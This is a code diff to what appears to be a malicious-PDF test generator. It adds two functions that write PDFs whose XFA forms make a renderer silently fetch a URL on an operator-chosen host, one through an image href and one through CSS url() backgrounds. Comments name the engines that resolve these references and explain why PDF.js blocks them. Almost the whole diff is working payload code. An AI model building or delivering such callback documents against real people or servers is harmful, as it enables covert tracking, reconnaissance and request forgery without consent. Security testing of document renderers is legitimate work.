@@ -4181,6 +4181,123 @@ trailer <<
 >>''')
 
 
+# XFA remote image reference: <image href="http://...">
+# The XFA spec lets an image field name its content by href instead of carrying
+# base64 content inline. A processor that resolves that href fetches it at
+# render time, with no user interaction and no scripting involved.
+#
+# Distinct from test14, which is an SVG/MSL ImageMagick polyglot, and from the
+# other XFA tests here, which exfiltrate through submit (test2, test48),
+# FormCalc or XXE (test42) rather than by loading a remote resource.
+#
+# PDF.js refuses this by design -- src/core/xfa/template.js returns early for a
+# non-null href ("we don't get remote data and use what we have in the pdf
+# itself"), so its img src is always a blob: URL built from embedded bytes.
+# The probe targets XFA engines that do resolve it: Acrobat/LiveCycle, AEM
+# Forms and server-side XFA renderers.
+def create_malpdf50(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1
+1 0 obj <<>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<config><present><pdf>
+    <interactive>1</interactive>
+</pdf></present></config>
+<template>
+    <subform name="_">
+        <pageSet/>
+        <field name="img1" w="2in" h="2in">
+            <ui><imageEdit/></ui>
+            <value>
+                <image contentType="image/png"
+                       href="''' + host + '''/test50-xfa-image-href"/>
+            </value>
+        </field>
+    </subform>
+</template>
+</xdp:xdp>
+endstream
+endobj
+trailer <<
+    /Root <<
+        /AcroForm <<
+            /Fields [<<
+                /T (0)
+                /Kids [<<
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                >>]
+            >>]
+            /XFA 1 0 R
+        >>
+        /Pages <<>>
+    >>
+>>''')
+
+
+# CSS url() inside XFA rich text
+# An XFA field whose value is exData with contentType text/html carries an
+# XHTML fragment. A processor that renders that fragment as real HTML/CSS will
+# resolve a url() in a style attribute, giving a callback with no interaction.
+#
+# Distinct from test43, which puts an <img> tag in an annotation /T field for
+# web viewers; this one is CSS rather than markup, and travels in XFA.
+#
+# PDF.js filters this out: src/core/xfa/xhtml.js keeps only VALID_STYLES, which
+# has no url()-bearing property, and XfaLayer rejects url( again for richText.
+# Several background properties are sent so a processor that allows one but not
+# another still reports. Targets XFA renderers and PDF-to-HTML converters.
+def create_malpdf51(filename, host):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1
+1 0 obj <<>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<config><present><pdf>
+    <interactive>1</interactive>
+</pdf></present></config>
+<template>
+    <subform name="_">
+        <pageSet/>
+        <field name="rich1" w="6in" h="2in">
+            <ui><textEdit allowRichText="1"/></ui>
+            <value>
+                <exData contentType="text/html">
+                    <body xmlns="http://www.w3.org/1999/xhtml">
+                        <p style="background:url(''' + host + '''/test51-xfa-css-background)">x</p>
+                        <p style="background-image:url(''' + host + '''/test51-xfa-css-bgimage)">x</p>
+                        <p style="list-style-image:url(''' + host + '''/test51-xfa-css-list)">x</p>
+                    </body>
+                </exData>
+            </value>
+        </field>
+    </subform>
+</template>
+</xdp:xdp>
+endstream
+endobj
+trailer <<
+    /Root <<
+        /AcroForm <<
+            /Fields [<<
+                /T (0)
+                /Kids [<<
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                >>]
+            >>]
+            /XFA 1 0 R
+        >>
+        /Pages <<>>
+    >>
+>>''')
+
+
 # CVE-2026-16633: PDF.js scripting-sandbox bridge accepts a forged editor
 # Affects pdfjs-dist >= 5.6.205 (the GitHub advisory says 5.6.83; the reporter
 # traces the chain to commit 04272de, first shipped in 5.6.205) < 6.2.108.
@@ -4438,6 +4555,8 @@ def main():
         47: "PDF 2.0 /AF Associated Files with embedded HTML/JS",
         48: "XFA SOAP submit with initialize event (Acrobat XFA engine)",
         49: "CVE-2026-16633 - forged editor via scripting-sandbox bridge (PDF.js)",
+        50: "XFA <image href> remote resource load (Acrobat/LiveCycle/AEM)",
+        51: "CSS url() in XFA rich text exData (XFA renderers, PDF-to-HTML)",
     }
 
     pdf_generators = {
@@ -4513,6 +4632,8 @@ def main():
         47: (create_malpdf47, ensure_scheme(host)),
         48: (create_malpdf48, ensure_scheme(host)),
         49: (create_malpdf49, ensure_scheme(host)),
+        50: (create_malpdf50, ensure_scheme(host)),
+        51: (create_malpdf51, ensure_scheme(host)),
     }
 
     file_extensions = {14: '.svg'}
